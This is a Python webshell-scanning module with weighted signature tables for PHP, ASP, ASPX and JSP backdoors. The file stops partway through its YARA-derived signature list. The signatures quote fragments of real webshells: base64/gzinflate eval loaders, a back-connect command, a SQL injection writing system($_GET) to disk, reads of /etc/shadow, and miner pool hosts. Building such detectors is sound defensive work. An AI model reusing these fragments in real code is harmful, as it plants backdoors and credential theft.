"""
WebShell 木马查杀模块
=====================================================================
检测引擎核心三要素：

  1. 按脚本类型分流 (PHP / ASP / ASPX / JSP)，各自独立规则集
  2. 特征串带「词边界」匹配：
     子串命中后检查前一字节字符类别，避免 eval 误命中 reeval
  3. 0/2/3 三级判定：
     score>=阈值 -> level 3 (恶意) / >=40% -> level 2 (可疑) / 否则 0 (干净)

采用加权累加再映射到等级的方式，便于按环境调阈值。

对外接口:
  scan_local(path, ...)                   本地目录/文件扫描
  scan_remote(remote_dir, ...)            SSH 远程扫描(自动拉回可疑文件)
"""

import os
import re
import shlex
import time
from bisect import bisect_right
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

from defence import ssh
from defence._bootstrap import get_runtime_dir
from defence.state import state_manager

try:
    from termcolor import colored
except Exception:                                    # termcolor 缺失时降级
    def colored(text, *a, **k):
        return text


# ==================================================================== 规则表
# 每条规则: (特征串, 权重)。权重按危险程度分级，危险函数链类规则计高分。

PHP_EXEC = [
    ("system", 60), ("exec", 60), ("shell_exec", 70), ("passthru", 65),
    ("proc_open", 70), ("popen", 65), ("pcntl_exec", 70),
]

PHP_EVAL = [
    ("eval(", 80), ("assert(", 70), ("create_function(", 70),
    ("preg_replace(", 45), ("mb_ereg_replace(", 45),
    ("preg_replace_callback(", 40), ("mb_ereg_replace_callback(", 40),
    ("preg_filter(", 40), ("ob_start(", 30),
    ('"eval"', 55), ("'eval'", 55), ('"assert"', 50), ("'assert'", 50),
]

PHP_CALLBACK = [
    ("call_user_func(", 50), ("call_user_func_array(", 50),
    ("array_map(", 25), ("array_walk(", 25), ("array_walk_recursive(", 25),
    ("array_filter(", 22), ("array_reduce(", 22), ("array_udiff(", 22),
    ("array_diff_uassoc(", 22), ("array_diff_ukey(", 22),
    ("uasort(", 22), ("uksort(", 22), ("register_shutdown_function(", 45),
    ("register_tick_function(", 45), ("session_set_save_handler(", 45),
    ("filter_var(", 18), ("filter_var_array(", 18), ("yaml_parse(", 40),
    ("ReflectionFunction(", 55),
    # 回调族补充（覆盖更完整的回调注入面）
    ("array_intersect_uassoc(", 35), ("array_udiff_assoc(", 30),
    ("usort(", 20), ("forward_static_call(", 45), ("forward_static_call_array(", 45),
    ("callbackfilteriterator", 45), ("iterator_apply(", 45),
    ("set_error_handler(", 40), ("preg_replace_callback_array(", 40),
    ("ReflectionClass(", 45), ("ReflectionMethod(", 45), ("ReflectionParameter(", 40),
    ("is_callable(", 15), ("preg_replace_callback(", 40), ("preg_filter(", 40),
]

PHP_OBFUSC = [
    ("base64_decode(", 45), ("str_rot13(", 40), ("gzinflate(", 45),
    ("gzuncompress(", 45), ("gzdecode(", 45), ("strrev(", 25),
    ("chr(", 20), ("urldecode(", 25), ("strtr(", 25), ("pack(", 30),
    ("%7b", 30), ("${", 30), ("$$", 30),
]

PHP_FILE = [
    ("file_put_contents(", 45), ("fwrite(", 22), ("fputs(", 22),
    ("move_uploaded_file(", 28), ("file_get_contents(", 15),
    ("copy(", 12), ("rename(", 12), ("fopen(", 15), ("unlink(", 15),
    ("include(", 30), ("include_once(", 30), ("require(", 30), ("require_once(", 30),
]

PHP_NET = [
    ("fsockopen(", 45), ("socket_create(", 45), ("setsockopt(", 30),
    ("curl_exec(", 30), ("curl_setopt(", 20),
]

PHP_SUPER = [
    ("$_post[", 35), ("$_get[", 30), ("$_request[", 35), ("$_cookie[", 35),
    ("$_server[", 20), ("$_files[", 30), ("$http_post_vars[", 40),
    ("$http_get_vars[", 40), ("php://input", 55), ("php://filter", 45),
    ("phar://", 40), ("data://", 45),
]

PHP_MARKER = [
    ("phpinfo(", 55), ("zend_", 25), ("$i30:", 60), ("::", 45),
    ("getenv(", 25),
]

# 变量注入族
PHP_INJECT = [
    ("extract(", 45), ("parse_str(", 45), ("import_request_variables", 60),
    ("$globals[", 40), ("$$", 35), ("$v{", 35), ("${", 30),
    ("mb_parse_str(", 40), ("variable_variables", 40),
]

# 僵尸/自删除后门
PHP_ZOMBIE = [
    ("__destruct", 60), ("ignore_user_abort", 70), ("set_time_limit(0)", 55),
    ("unlink(__file__)", 90), ("unlink($_server", 70),
    ("file_put_contents(__file__", 90), ("chmod(__file__", 60),
    ("auto_prepend_file", 80), ("auto_append_file", 80),
]

# 打包马/Phar（__HALT_COMPILER / phar:// / Zend）
PHP_PACKED = [
    ("__halt_compiler(", 90), ("phar://", 55), ("phar::", 55),
    ("zend_guard", 60), ("zend_loader", 50), ("ioncube", 55),
    ("sourceguardian", 60), ("sg_load", 60),
]

# 已知木马工具签名（样本级特征）
PHP_TOOL_SIG = [
    ("c99shell", 95), ("phpspy", 95), ("r57shell", 95), ("b374k", 95),
    ("weeevely", 90), ("weevely", 90), ("quasibot", 90), ("cnseay", 90),
    ("egy_spider", 90), ("tools88.com", 85), ("cha88.cn", 85),
    ("jspSpyPwd".lower(), 90), ("aspXSpy".lower(), 90), ("aspxspy", 90),
    ("jshell", 80), ("cmd.php", 70), ("backfile", 60),
    ("b374k_shell_packer", 95), ("scanshell_full", 85),
]

# 冰蝎 Behinder（含 3.0）样本级特征
BEHINDER_SIG = [
    ("substr(md5(uniqid(rand", 110), ("openssl_decrypt", 80),
    ("file_get_contents(\"php://input", 75), ("php://input", 65),
    ("{eval(", 85), ("request.binaryread", 70),
    ("xor asc(mid", 80), ("hex((255-17)*rnd+16", 90),
    ("cipher.getinstance(\"aes\")", 90), ("sun.misc.base64decoder", 85),
    ("uuid.randomuuid()", 70), ("super.defineclass", 85),
    ("guid.newguid().tostring", 80), ("rijndaelmanaged().createdecryptor", 90),
    ("transformfinalblock", 70), ("encoding.default.getbytes(session", 85),
]

# 哥斯拉 Godzilla 样本级特征
GODZILLA_SIG = [
    ("system.bitconverter.tostring", 90),
    ("md5cryptoserviceprovider", 85),
    ("system.convert.frombase64string", 70),
    ("substring(16)", 65), ("explode('|'", 70),
    ("context.request.binaryread", 85), (".getmethod", 55),
    ("system.reflection.assembly", 80), ("javax.crypto.cipher.getinstance", 85),
    ("((class)session", 80), ("pagecontext.getclass().getclassloader()", 80),
    ("request.getinputstream()", 70),
]

# 挖矿
PHP_MINER = [
    ("mine.moneropool.com", 110), ("xmr.crypto-pool.fr", 110),
    ("stratum.f2pool.com", 110), ("xmrpool.eu", 110),
    ("xmrig", 100), ("cryptonight", 100), ("miner.start", 90),
    ("stratum+tcp://", 100), ("--donate-level", 90), ("monero", 70),
    ("coinhive", 90), ("webminepool", 90),
]

# SEO 寄生虫（样本中占比最大的一类）
PHP_SEO = [
    ("aq0o010o", 100), ("adjsc00002", 100),
    ("remote_directory = remote_server", 100),
    ("deasc=deasc", 95), ("branch_directory_1", 90),
    ("sitemap.php?host=", 85), ("/getcon.php?url=", 85), ("/saveurl.php?url=", 85),
    ("msxml2.xmlhttp", 60), ("setrequestheader \"user-agent\"", 55),
]

# 数据库攻击/提权（导库 / 写 DLL / 脱库）
PHP_DB = [
    ("load_file(", 60), ("into outfile", 85), ("into dumpfile", 85),
    ("xp_cmdshell", 90), ("sp_configure", 70), ("sys_exec", 90), ("sys_eval", 90),
    ("udf_init", 85), ("mysql_list_dbs", 70), ("mysql_udf", 90),
    ("c:/windows/diy.dll", 95),
]

# 持久化/计划任务
PERSIST_RULES = [
    ("schtasks.exe /create", 110), ("schtasks /create", 100),
    ("crontab -l", 70), ("crontab -i", 80), ("/etc/cron.d/", 80),
    ("hkey_local_machine\\software\\microsoft\\windows\\currentversion\\run", 90),
    ("rc.local", 70), ("systemd/system", 70), ("/tmp/run.sh", 80),
    ("tmp\\run.bat", 90),
]

# 免杀构造技巧与马套件标识
# 依据 webshell-master 真实样本集（1765 个样本，含 381 PHP/244 JSP/119 ASP/59 ASPX）
# 的漏检样本归纳 —— 这批样本能过掉传统函数名黑名单，靠的是"不含危险函数名"。
EVASION_RULES = [
    # ---- PHP 无字母 / 可变变量马 ----
    ("${$_}", 95),                       # 可变变量链，无字母马核心结构
    ("$_=$_", 75),                       # $_ 自身赋值（异或/取反构造入口）
    ("$_=\"", 60),
    ("${'_'", 65),                       # ${'_'.$_} 变体
    ("$__[", 55),
    ("getallheaders()", 80),             # 从请求头取载荷，典型免杀马
    ("getallheaders()['", 90),
    # ---- 字符串异或 / 位运算构造（PHP 用 ^ 拼函数名）----
    ("\"^\"", 40),
    ("^\"!{", 65),
    ("^\"?<>", 70),
    # ---- ASP / JScript Script Encoder 与混淆 ----
    ("#@~^", 90),                        # Script Encoder 编码体起始标志
    ("<script language=\"vbscript.encode\">", 95),
    ("<script language=\"jscript.encode\">", 95),
    ("/*-/*-*/", 75),                    # 注释碎片穿插混淆
    ("<%@ page language = jscript %>", 60),
    ("decode(codeds)", 90),              # 凯撒位移马（hkmjj 类）
    ("execute (decode", 90),
    ("function decode(code", 70),
    # ---- JSP 马与套件 ----
    ("jsp_kit", 90),                     # JSP_KIT 套件注释 banner
    ("= directory & file view", 90),
    ("jsp = command execution", 90),
    ("clzbytecodebase64str", 95),        # Java 字节码 Base64 注入马
    ("jdk.jshell.jshell", 95),           # JShell 执行马（JDK9+）
    ("scriptenginemanager", 55),
    ("getruntime().exec", 70),
    # ---- ASP.NET 后门 ----
    ("system.data.sqlclient", 55),
    ("enableviewstatemac=\"false\"", 60),
    ("validaterequest=\"false\"", 55),
    ("asp.net后门", 90),
    # ---- 通用免杀特征 ----
    ("@extract($_", 75),
    ("$globals[\"cwd\"]", 60),
    ("array_map(\"ass", 80),             # array_map("assert", ...) 反射式一句话
    ("array_map('ass", 80),
]

ASP_ENTRIES = [
    ("eval(", 80), ("execute(", 75), ("executeglobal(", 75),
    ("eval request(", 95), ("eval request", 90), ("eval(request(", 95),
    ("execute request(", 95), ("execute(request(", 95),
    ('createobject("wscript.shell")', 80), ('createobject("adodb.stream")', 75),
    ('server.createobject("scripting.filesystemobject")', 45),
    ('createobject("microsoft.xmlhttp")', 50),
    ("scripting.filesystemobject", 30), ("wscript.shell", 60),
    ("wscript.network", 45), ("shell.application", 55),
]

ASP_OBFUSC = [
    ("vbscript.encode", 80), ("baseaspdecode", 70), ("baseaspencmap", 70),
    ("chr(", 25), ("ascb(", 30), ("midb(", 25), ("strreverse(", 35),
    ("unescape(", 35), ("codepage", 25), ("@codepage", 30), ("charset=utf-7", 70),
]

ASP_EX = [
    ("request(", 25), ("request.form(", 30), ("request.querystring(", 30),
    ("server.mappath(", 30), ("createtextfile(", 40), ("savetofile(", 40),
    ("opentextfile(", 30), ("response.binarywrite", 40),
    (".loadfromfile(", 40), (".executestatement(", 40),
    ("global.asa", 45), ("application_onend", 45),
    # ASP 管理型后门补充
    ("application.lock", 40), ("application.unlock", 35),
    ("session.removeattribute", 40), ("request.files", 35),
    ("response.addheader", 30), ("response.contenttype", 25),
    ("response.redirect", 20), ("readall", 35), ("chrb(", 30),
    ("scriptcontrol", 60), ("adodb.connection", 45), ("adodb.recordset", 45),
    ("new activexobject", 55), ("serverxmlhttp", 55),
]

ASPX_ENTRIES = [
    ("eval(", 70), ("execute(", 60), ("assert(", 60), ("httpcontext", 25),
    ("system.diagnostics.process", 85), ("processstartinfo", 80),
    ("assembly.load", 85), ("binaryformatter", 80), ("deserialize", 70),
    ("frombase64string", 70), ("assembly.loadfrom", 85),
    ("compileassemblyfromsource", 80), ("mainmodule", 70),
    ("windowsidentity", 65), ("appdomain", 60), ("type.gettype", 65),
    ("activator.createinstance", 65),
]

# ASPX/.NET 细粒度 API 面 —— 大幅补齐（调用点/注册表/服务/线程/Socket/反序列化等）
ASPX_DEEP = [
    ("dllimport", 70), ("registrykey", 60), ("registry.localmachine", 65),
    ("system.management", 70), ("managementobjectsearcher", 80),
    ("win32_process", 85), ("system.serviceprocess", 65), ("servicecontroller", 70),
    ("system.threading", 45), ("new thread(", 55), ("system.directoryservices", 70),
    ("directorysearcher", 75), ("system.net.sockets", 65), ("tcpclient", 70),
    ("udpclient", 70), ("system.codedom", 80), ("csharpcodeprovider", 85),
    ("compilerresults", 75), ("virtualpathprovider", 90), ("buildmanager", 85),
    ("httphandlerfactory", 85), ("losformatter", 85), ("objectstateformatter", 85),
    ("javascriptserializer", 70), ("microsoft.visualbasic", 65),
    ("system.web.services", 55), ("webclient", 60), ("httpwebrequest", 60),
    ("system.io.memorystream", 45), ("filestream", 40), ("streamreader", 35),
    ("streamwriter", 35), ("directoryinfo", 35), ("fileinfo", 35),
    ("gzipstream", 45), ("system.security.cryptography", 50),
    ("rijndaelmanaged", 70), ("md5cryptoserviceprovider", 55),
    ("htmlinputfile", 60), ("xsltprocessor", 55), ("gettype().getmethod", 60),
]

JSP_ENTRIES = [
    ("runtime.getruntime().exec", 90), ("processbuilder", 85),
    ("filesystemobject", 60), ("fileoutputstream", 55),
    ("bufferedwriter", 45), ("defineclass", 80), ("classloader", 70),
    ("scriptengine", 70), ("urlclassloader", 75),
    # JSP 补充
    ("randomaccessfile", 55), ("fileinputstream", 45), ("gzipinputstream", 60),
    ("zipentry", 55), ("zipfile", 55), ("getrealpath", 35), ("deletefile", 40),
    ("listfiles", 35), ("class.forname", 65), ("getruntime()", 60),
    ("servletcontext", 40), ("pagecontext.getclass", 70),
]

# .htaccess / httpd 配置后门 —— AWD 中常被用来把图片/文本当 PHP 执行
# 注: RewriteEngine / RewriteRule 是正常站点的常规配置，不计分(避免误报)
HTACCESS_RULES = [
    ("addtype", 90), ("addhandler", 90), ("sethandler", 90),
    ("auto_prepend_file", 100), ("auto_append_file", 100),
    ("php_value", 70), ("php_flag", 70), ("php_admin_value", 80),
    ("application/x-httpd-php", 100), ("options +exec", 60),
]

# 脚本/静态文件里藏马 —— 这类扩展名常被扫描器直接排除，是免杀盲区
# (.css/.js/.xml/.map/.doc/.xls 等)，攻击者改个扩展名即可免杀；
# 这里改为"只要出现脚本标签或服务端代码特征就报警"。
JS_RULES = [
    ("<?php", 100), ("<?=", 90), ("<%@", 90), ("<%=", 80),
    ('<script language="php"', 100),
    ("eval(", 25), ("assert(", 25), ("system(", 30), ("shell_exec(", 50),
    ("base64_decode(", 35), ("gzinflate(", 40),
    ("$_post[", 50), ("$_get[", 45), ("$_request[", 50), ("$_cookie[", 45),
    ("runtime.getruntime", 60), ("processbuilder", 55),
]

# ==== YARA 规则库特征（由 gen_yara_rules.py 生成，勿手工编辑） ====
# YARA_PHP_SIGS —— 来源: Yara-Rules 社区库 webshells/ (THOR APT Scanner webshell 子集等)
YARA_PHP_SIGS = [
    ("echo \"<option value=\\\"\". strrev(substr(strstr(strrev($work_dir), \"/\"), 1)) .\"\\\">Parent Directory</option>\\n\";", 90),
    ("$_POST['backcconnmsge']=\"</br></br><b><font color=red size=3>Error:</font> Can't backdoor host!</b>\";", 90),
    ("$st_form_bg='R0lGODlhCQAJAIAAAOfo6u7w8yH5BAAAAAAALAAAAAAJAAkAAAIPjAOnuJfNHJh0qtfw0lcVADs=';", 90),
    ("$blah = ex($p2.\" /tmp/back \".$_POST['backconnectip'].\" \".$_POST['backconnectport'].\" &\");", 90),
    ("echo \"<option value=delete\".($dspact == \"delete\"?\" selected\":\"\").\">Delete</option>\";", 90),
    ("         echo \"<script>str$i=\\\"\".str_replace(\"\\\"\",\"\\\\\\\"\",str_replace(\"\\\\\",\"\\\\\\\\\"", 90),
    ("      echo \"<hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\"", 90),
    ("      echo \"<hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n<", 90),
    ("$DEF_PORTS=array (1=>'tcpmux (TCP Port Service Multiplexer)',2=>'Management Util", 90),
    ("$ar_file=array('/etc/passwd','/etc/shadow','/etc/master.passwd','/etc/fstab','/e", 90),
    ("$err = \"<i>Your Name</i> Not Entered!</font></h2>Sorry, \\\"Your Name\\\" field is r", 90),
    ("$file = str_replace(\"\\\\\", \"/\", str_replace(\"//\", \"/\", str_replace(\"\\\\\\\\\", \"\\\\\", ", 90),
    ("$port = base_convert(bin2hex(substr($reqmessage[$id], 3+$reqlen+1, 2)), 16, 10);", 90),
    ("(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU", 90),
    ("++$F; $File = urlencode($dir[$dirFILE]); $eXT = '.:'; if (strpos($dir[$dirFILE],", 90),
    ("<?$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_u", 90),
    ("<?$d='G7mHWQ9vvXiL/QX2oZ2VTDpo6g3FYAa6X+8DMIzcD0eHZaBZH7jFpZzUz7XNenxSYvBP2Wy36U", 90),
    ("<?php $K=sTr_RepLaCe('`','','a`s`s`e`r`t');$M=$_POST[ice];IF($M==NuLl)HeaDeR('St", 90),
    ("<?php $OOO000000=urldecode('%61%68%36%73%62%65%68%71%6c%61%34%63%6f%5f%73%61%64'", 90),
    ("<?php $id_info = array('notify' => 'off','sub' => 'aasd','s_name' => 'nurullahor", 90),
    ("<hr>to browse go to http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=[directory he", 90),
    ("<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]<?php echo PHPSHELL_VERSION ?></", 90),
    ("echo \"  <td align=\\\"center\\\" nowrap valign=\\\"top\\\"><a href=\\\"?downfile=\".urlenco", 90),
    ("echo \"&nbsp;<a href=\"\"/\"&encodeForUrl(theHref,false)&\"\"\" target=_blank>\"&replace", 90),
    ("echo \"<br>\".ws(2).\"HDD Free : <b>\".view_size($free).\"</b> HDD Total : <b>\".view_", 90),
    ("echo \"<input size=\\\"100\\\" type=\\\"text\\\" name=\\\"newfile\\\" value=\\\"$inputfile\\\"><b", 90),
    ("echo \"\\t<th class=\\\"permission_header\\\"><a href=\\\"$self?{$d}sort=permission$r\\\">", 90),
    ("echo --==Userinfo==-- ; id;echo;echo --==Directory==-- ; pwd;echo; echo --==Shel", 90),
    ("elseif(($regwrite) AND !empty($_POST['writeregname']) AND !empty($_POST['regtype", 90),
    ("elseif(isset($_GET['savefile']) && !empty($_POST['filetosave']) && !empty($_POST", 90),
    ("eval(gzinflate(base64_decode('FJzHkqPatkU/550IGnjXxHvv6bzAe0iE5+svFVGtKqXMZq05x1", 90),
    ("eval(gzinflate(base64_decode('HJ3HkqNQEkU/ZzqCBd4t8V4YAQI2E3jvPV8/1Gw6orsVFLyXef", 90),
    ("if (!$nix) { $xid = implode(explode(\"\\\\\",$xid),\"\\\\\\\\\");}echo (\"<td><a href='Java", 90),
    ("if (!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER']!==$name || $_", 90),
    ("if (isset($_POST['mysqlw_host'])){$dbhost = $_POST['mysqlw_host'];} else {$dbhos", 90),
    ("if(!empty($_FILES['ufp']['name'])){if($_POST['ufn'] != '') $upfilename = $_POST[", 90),
    ("if($run == 1 && $phpshellapp && $phpshellhost && $phpshellport) $strOutput .= DB", 90),
    ("if(eregi('WHERE|LIMIT',$_POST['nsql']) && eregi('SELECT|FROM',$_POST['nsql'])) $", 90),
    ("return base64_decode('R0lGODlhEQANAJEDAMwAAP///5mZmf///yH5BAHoAwMALAAAAAARAA0AAA", 90),
    ("while($data=ocifetchinto($stm,$data,OCI_ASSOC+OCI_RETURN_NULLS))$res.=implode('|", 90),
    ("while($data=pg_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+", 90),
    ("      echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>\\n\";", 90),
    ("$_=str_rot13('tm'.'vas'.'yngr');$_=str_rot13(strrev('rqb'.'prq'.'_'.'46r'.'fno'", 90),
    ("$back_connect_p=\"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbi", 90),
    ("$ftpconnect = \"ncftpput -u $ftp_user_name -p $ftp_user_pass -d debsender_ftplog", 90),
    ("$perl_proxy_scp = \"IyEvdXNyL2Jpbi9wZXJsICANCiMhL3Vzci91c2MvcGVybC81LjAwNC9iaW4v", 90),
    ("Show <input type=text size=5 value=\".((isset($_POST['br_st']))?$_POST['br_st']:", 90),
    ("Show<input type=text size=5 value=\".((isset($_POST['br_st']) && isset($_POST['b", 90),
    ("echo \"<a href='./$this_file?op=efp&fname=$path/$file&dismi=$file&yol=$path'><fo", 90),
    ("echo \"<a href='?id=fm&fchmod=$dir$file'><span style='text-decoration: none'><fo", 90),
    ("echo \"<a target='_blank' href='?id=fm&fedit=$dir$file'><span style='text-decora", 90),
    ("echo \"<b><font color=blue>Liz0ziM Private Safe Mode Command Execuriton Bypass E", 90),
    ("echo \"<center><div id=logostrip>Edit file: $editfile </div><form action='$REQUE", 90),
    ("echo \"<center><font size='$sayi' color='#FFFFFF'>HACKLERIN<font color='#008000'", 90),
    ("echo \"<center><form name=client method='POST' action='$_SERVER[PHP_SELF]?do=db'", 90),
    ("echo \"<p><font size=2 face=Verdana><b>This Is The Server Information</b></font>", 90),
    ("echo \"<td><a href='$PHP_SELF?action=deleteData&dbname=$dbname&tablename=$tablen", 90),
    ("echo \"Hacking Mode?<br><select name='htype'><option >--------SELECT--------</op", 90),
    ("eval(base64_decode(\"ZXZhbChiYXNlNjRfZGVjb2RlKCJhV2R1YjNKbFgzVnpaWEpmWVdKdmNuUW9", 90),
    ("if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == \"d", 90),
    ("if ($l) echo '<a href=\"' . $self . '?action=permission&amp;file=' . urlencode($", 90),
    ("if ((!empty($donated_html)) and (in_array($act,$donated_act))) {echo \"<TABLE st", 90),
    ("if(!@opendir($chdir)) $ch_msg=\"dtool: line 1: chdir: It seems that the permissi", 90),
    ("    <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><?= $info ?>: <?= ", 90),
    (" else {echo \"<b>Execution PHP-code</b>\"; if (empty($eval_txt)) {$eval_txt = tr", 90),
    ("$Message = q$<pre><font color=\"#669999\"> _____  _____  _____          _____   ", 90),
    ("$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');", 90),
    ("$from    = \"Neu-Cool@email.com\";  // Who should the emails be sent from?, may ", 90),
    ("$header='<html><head><title>'.getenv(\"HTTP_HOST\").' - Antichat Shell</title><m", 90),
    ("$opt_charsets .= '<option value=\"'.$item.'\" '.($_POST['charset']==$item?'selec", 90),
    ("$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\\winnt\\backdoor.exe'", 90),
    ("$sql = \"0' UNION SELECT '0' , '<? system(\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 IN", 90),
    ("<b>IP:</b> <u>\" . $_SERVER['REMOTE_ADDR'] .\"</u> - Server IP:</b> <a href='htt", 90),
    ("<input type=checkbox name='dd' \".(isset($_POST['dd'])?'checked':'').\">DB<input", 90),
    ("<li><a href=\"<?php echo plugins_url('file.php', __FILE__);?>\">File Browser</a>", 90),
    ("<pre><form action=\"<? echo $PHP_SELF; ?>\" METHOD=GET >execute command: <input ", 90),
    ("echo \"Command : <INPUT TYPE=text NAME=cmd value=\".@stripslashes(htmlentities($", 90),
    ("echo $te.\"<div align=center><textarea cols=35 name=db_query>\".(!empty($_POST['", 90),
    ("elseif(fe(\"system\")){ob_start();system($s);$r=ob_get_contents();ob_end_clean()", 90),
    ("if($_POST['save']==0){echo \"<textarea cols=70 rows=10>\".htmlspecialchars($dump", 90),
    ("   elseif (!$data = c99getsource($bind[\"src\"])) {echo \"Can't download sources", 90),
    ("  echo \"<br><center>All the data in these tables:<br> \".$tblsv.\" were putted ", 90),
    ("  if ($copy_unset) {foreach($sess_data[\"copy\"] as $k=>$v) {unset($sess_data[\"", 90),
    ("$hexdtime = '\\x' . $dtime[6] . $dtime[7] . '\\x' . $dtime[4] . $dtime[5] . '\\x", 90),
    ("$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname.", 90),
    ("<td><input type=\"text\" name=\"command\" size=\"60\" value=\"<?=$_POST['command']?>", 90),
    ("echo \"<meta http-equiv=Refresh content=\\\"0; url=$PHP_SELF?edit=$nameoffile&sh", 90),
    ("echo \"Cliquez sur un nom de fichier pour lancer son telechargement. Cliquez s", 90),
    ("echo $head.\"<font face='Tahoma' size='2'>Operating System : \".php_uname().\"<b", 90),
    ("elseif (!empty($ft)) {echo \"<center><b>Manually selected type is incorrect. I", 90),
    ("if ((!$_POST['cmd']) || ($_POST['cmd']==\"\")) { $_POST['cmd']=\"id;pwd;uname -a", 90),
    ("if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=($windows)?(\"dir\"):(\"l", 90),
    ("if(isset($_POST['post']) and $_POST['post'] == \"yes\" and @$HTTP_POST_FILES[\"u", 90),
    ("print \"<tr><td><b>Server is:</b></td><td>\".$_SERVER['SERVER_SIGNATURE'].\"</td", 90),
    ("   elseif (!$data = c99getsource($bc[\"src\"])) {echo \"Can't download sources!", 90),
    ("  echo \"<center><b>MySQL \".mysql_get_server_info().\" (proto v.\".mysql_get_pr", 90),
    ("  if (file_exists($mkfile)) {echo \"<b>Make File \\\"\".htmlspecialchars($mkfile", 90),
    ("  if (unlink(_FILE_)) {@ob_clean(); echo \"Thanks for using c99shell v.\".$shv", 90),
    (" Echo \"<input type=button name=Submit onclick=\"\"document.location =&#039;\" &", 90),
    ("$program = isset($_POST['program']) ? $_POST['program'] : \"c:\\winnt\\system32", 90),
    ("$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP", 90),
    ("echo $msg=@copy($_FILES['uploadmyfile']['tmp_name'],\"\".$uploaddir.\"/\".$_FILE", 90),
    ("echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=pos", 90),
    ("echo sr(15,\"<b>\".$lang[$language.'_text21'].$arrow.\"</b>\",in('checkbox','nf1", 90),
    ("echo sr(15,\"<b>\".$lang[$language.'_text58'].$arrow.\"</b>\",in('text','mk_name", 90),
    ("else {$act = \"f\"; $d = dirname($mkfile); if (substr($d,-1) != DIRECTORY_SEPA", 90),
    ("elseif ( $cmd==\"downl\" ) { /*<!-- Save the edited file back to a file --> */", 90),
    ("if  ( ( (isset($http_auth_user) ) && (isset($http_auth_pass)) ) && ( !isset(", 90),
    ("if (($fsock = fsockopen($url2['host'], 80, $errno, $errstr, $fsock_timeout))", 90),
    ("if (($i = array_search($_REQUEST['command'], $_SESSION['history'])) !== fals", 90),
    ("if (true==@move_uploaded_file($_FILES['userfile']['tmp_name'],self::convert_", 90),
    ("if(!($sqlcon = @mysql_connect($_SESSION['sql_host'] . ':' . $_SESSION['sql_p", 90),
    ("if(!empty($_POST['mysql_db'])) { @mssql_select_db($_POST['mysql_db'],$db); }", 90),
    ("if(!empty($_POST['s_mask']) && !empty($_POST['m'])) { $sr = new SearchResult", 90),
    ("if($_GET[\"hackers\"]==\"2b\"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo ", 90),
    ("{ $pwd = $_POST[\"pwd\"]; $type = filetype($pwd); if($type === \"dir\")chdir($pw", 90),
    ("} elseif (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $_REQUEST['command'], ", 90),
    ("}$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTT", 90),
    ("$aids = passthru(\"perl cbs.pl \".$_POST['connhost'].\" \".$_POST['connport']);", 90),
    ("$result=mysql_list_tables($db) or die (\"$h_error<b>\".mysql_error().\"</b>$f_", 90),
    ("<?php passthru(getenv(\"HTTP_ACCEPT_LANGUAGE\")); echo '<br> by q1w2e3r4'; ?>", 90),
    ("<INPUT TYPE=\"text\" NAME=\"cmd\" value=\"<?php echo stripslashes(htmlentities($", 90),
    ("<form name=\"shell\" action=\"<?php echo $_SERVER['PHP_SELF'] ?>\" method=\"POST", 90),
    ("<input type=\"text\" size=61 name=\"f\" value='<?php echo $_SERVER[\"SCRIPT_FILE", 90),
    ("echo      \"<input name='p' type='text' size='27' value='\".dirname(_FILE_).\"", 90),
    ("echo \"<center>${t}MySQL cilent:</td><td bgcolor=\\\"#333333\\\"></td></tr><form", 90),
    ("echo \"<center>${t}Wordlist generator:</td><td bgcolor=\\\"#333333\\\"></td></tr", 90),
    ("echo \"<font color=$linkColor><b>MyShell file editor</font> File:<font color", 90),
    ("echo \"<td><a href='$PHP_SELF?action=dropDB&dbname=$dbname' onClick=\\\"return", 90),
    ("echo \"<tr><td class=\\\"silver border\\\">&nbsp;<strong>Server's PHP Version:&n", 90),
    ("echo sr(45,\"<b>\".$lang[$language.'_text80'].$arrow.\"</b>\",\"<select name=db>", 90),
    ("else {echo \"<center><b>File does not exists (\".htmlspecialchars($d.$f).\")!<", 90),
    ("else {echo \"<center><b>Unknown extension (\".$ext.\"), please, select type ma", 90),
    ("if($ok==false &&$status && $autoErrorTrap)system($command . \" 1> /tmp/outpu", 90),
    ("    echo \"( ) <a href=?file=\" . $fichero . \"/\" . $filename . \">\" . $filena", 90),
    ("  elseif (!fopen($mkfile,\"w\")) {echo \"<b>Make File \\\"\".htmlspecialchars($m", 90),
    (" <TR><TD bgcolor=\"<? echo (!$CONNECT && $action == \"chparam\")?\"#660000\":\"#", 90),
    ("$file = !empty($_POST[\"dir\"]) ? urldecode(self::convert_to_utf8(rtrim($_PO", 90),
    ("<option value=\"passthru\" <? if ($execfunc==\"passthru\") { echo \"selected\"; ", 90),
    ("if (@file_exists(\"/usr/bin/wget\")) $pro3=\"<i>wget</i> at /usr/bin/wget, \";", 90),
    ("if (empty($cmd) and $ch_msg==\"\") echo (\"Comandos Exclusivos do DTool Pro\\n", 90),
